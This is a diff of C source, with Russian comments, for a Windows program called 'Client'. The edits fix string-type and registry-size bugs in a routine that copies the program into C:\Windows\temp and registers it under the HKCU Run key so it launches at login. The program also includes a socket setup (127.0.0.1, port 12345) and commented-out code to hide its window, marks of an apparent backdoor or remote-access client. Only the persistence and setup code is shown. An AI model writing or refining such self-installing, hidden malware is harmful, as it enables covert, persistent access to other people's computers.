@@ -3,11 +3,11 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <winsock2.h>
-#include <windows.h>     // вместо dos.h и winreg.h
+#include <windows.h>
 #pragma comment(lib, "ws2_32.lib")
 #define Error -1
 #define Port 12345       
-#define IP "127.0.0.1"   // localhost - работает через проброс портов
+#define IP "127.0.0.1"
 
 // Функция добавления программы в автозагрузку и копирования в системную папку
 int Autorun() {
@@ -20,25 +20,27 @@ int Autorun() {
         return EXIT_FAILURE;
     }
     
-    // Создаем папку temp если её нет
-    CreateDirectory(L"C:\\Windows\\temp", NULL);
+    // Создаем папку temp если её нет (без L)
+    CreateDirectory("C:\\Windows\\temp", NULL);
     
-    // Копируем себя в C:\Windows\temp\Client.exe
-    if (!CopyFile(IpFilename, L"C:\\Windows\\temp\\Client.exe", 0)) {
+    // Копируем себя в C:\Windows\temp\Client.exe (без L)
+    if (!CopyFile(IpFilename, "C:\\Windows\\temp\\Client.exe", 0)) {
         printf("Error copying file (may need admin rights)\n");
     }
 
+    // Открываем ключ автозагрузки (без L)
     if (RegOpenKeyEx(HKEY_CURRENT_USER, 
-        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
         0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS){
         printf("Error opening registry key\n");
         RegCloseKey(hKey);
         return EXIT_FAILURE;
     }
 
-    if (RegSetValueEx(hKey, L"Client", 0, REG_SZ, 
-        (const BYTE*)L"C:\\Windows\\temp\\Client.exe", 
-        sizeof(L"C:\\Windows\\temp\\Client.exe") * 2) != ERROR_SUCCESS) {
+    // Записываем в реестр (без L)
+    if (RegSetValueEx(hKey, "Client", 0, REG_SZ, 
+        (const BYTE*)"C:\\Windows\\temp\\Client.exe", 
+        strlen("C:\\Windows\\temp\\Client.exe") + 1) != ERROR_SUCCESS) {
         printf("Error when creating a parameter\n");
         RegCloseKey(hKey);
         return EXIT_FAILURE;
@@ -53,7 +55,7 @@ int main() {
     // Пытаемся прописать себя в автозагрузку
     Autorun();
     
-    // Не скрываем окно сразу, чтобы увидеть ошибки (раскомментируйте позже)
+    // Для отладки окно пока не скрываем
     // HWND HWnd = GetConsoleWindow();
     // ShowWindow(HWnd, SW_HIDE);
 
